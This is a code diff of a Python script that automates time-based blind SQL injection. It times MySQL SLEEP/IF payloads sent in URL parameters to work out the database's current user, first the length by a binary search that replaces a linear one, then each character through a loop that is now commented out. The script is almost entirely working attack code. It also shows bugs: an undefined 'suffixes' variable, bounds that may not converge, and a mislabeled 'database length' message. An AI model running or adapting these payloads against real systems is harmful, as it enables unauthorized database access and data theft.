@@ -43,43 +43,68 @@ def checkTimeBlindSQLI(extractedPath,extractedParameters):
                 if end-start >= random_number_for_sleep:
                     print("sqli detected, payload:" + str(payload))
                     print("database is:" + str(x["database"]))
-                    getCurrentUser(extractedPath, i, extractedParameters)
+                    getCurrentUser(extractedPath, i, extractedParameters,y)
                 print("------------------------------------------------------------")
 
 
-def getCurrentUser(url,injectable_parameter,path):
-    current_user_length = 25
-    while True:
+def getCurrentUser(url,injectable_parameter,path, quote):
+    current_user_length_max = 24
+    current_user_length_min = 1
+    while current_user_length_max >= current_user_length_min:
         parameter_save = path[injectable_parameter]
-        path[injectable_parameter] += f" AND SLEEP(7-IF(LENGTH(CURRENT_USER)={current_user_length},0,7))-- "
+        mid  = (current_user_length_max + current_user_length_min) // 2
+        path[injectable_parameter] += f"{quote}AND SLEEP(7-IF(LENGTH(CURRENT_USER)>={mid},0,7))" + suffixes
+
+
         full_path = "&".join(str(parameter) for parameter in path)
         start = time.time()
         res = requests.get( url + "?" + full_path)
         end = time.time()
         print(url + "?" + full_path)
         path[injectable_parameter] = parameter_save
+         
+
+
         if end-start > 7:
-            print(f"current user length is {current_user_length}")
-            length = 1
-            current_user = ""
-            while length != current_user_length+1:
-                for a in range(48,127):
-                    path[injectable_parameter] += f" AND (SELECT 6261 FROM (SELECT(SLEEP(7-(IF(ORD(MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),{length},1))={a},0,7)))))Gttg)-- "
-                    full_path = "&".join(str(parameter) for parameter in path)
-                    start = time.time()
-                    res = requests.get( url + "?" + full_path)
-                    end = time.time()
-                    print(url + "?" + full_path)
-                    path[injectable_parameter] = parameter_save
-                    if end-start > 7:
-                        current_user +=chr(a)
-                        length+=1
+            # print(f"current user length is {current_user_length}")
+            path[injectable_parameter] += f"{quote}AND SLEEP(5-IF(LENGTH(CURRENT_USER)={mid},0,5))" + suffixes
+            full_path = "&".join(str(parameter) for parameter in path)
+            print(url + "?" + full_path)
+            path[injectable_parameter] = parameter_save
+            start = time.time()
+            res = requests.get( url + "?" + full_path)
+            end = time.time()
+            if end-start > 5:
+                print(f"database length is {mid}" )
+                exit(0)
+            else:
+                current_user_length_min = mid
+        else:
+            current_user_length_max = mid
+        print("min" + str(current_user_length_min))
+        print("max" + str(current_user_length_max))
+
+                 
+        #     while length != current_user_length+1:
+        #         for a in range(48,127):
+        #             path[injectable_parameter] += f" AND (SELECT 6261 FROM (SELECT(SLEEP(7-(IF(ORD(MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),{length},1))={a},0,7)))))Gttg)-- "
+        #             full_path = "&".join(str(parameter) for parameter in path)
+        #             start = time.time()
+        #             res = requests.get( url + "?" + full_path)
+        #             end = time.time()
+        #             print(url + "?" + full_path)
+        #             path[injectable_parameter] = parameter_save
+        #             if end-start > 7:
+        #                 current_user +=chr(a)
+        #                 length+=1
                         
-                        print(current_user)
-                        break
-                
-            exit(0)
-            current_user_length -=1
+        #                 print(current_user)
+        #                 break
+        #     if length == current_user_length:
+        #         exit(0)
+        # current_user_length -=1 
+             
+            
 
 
 
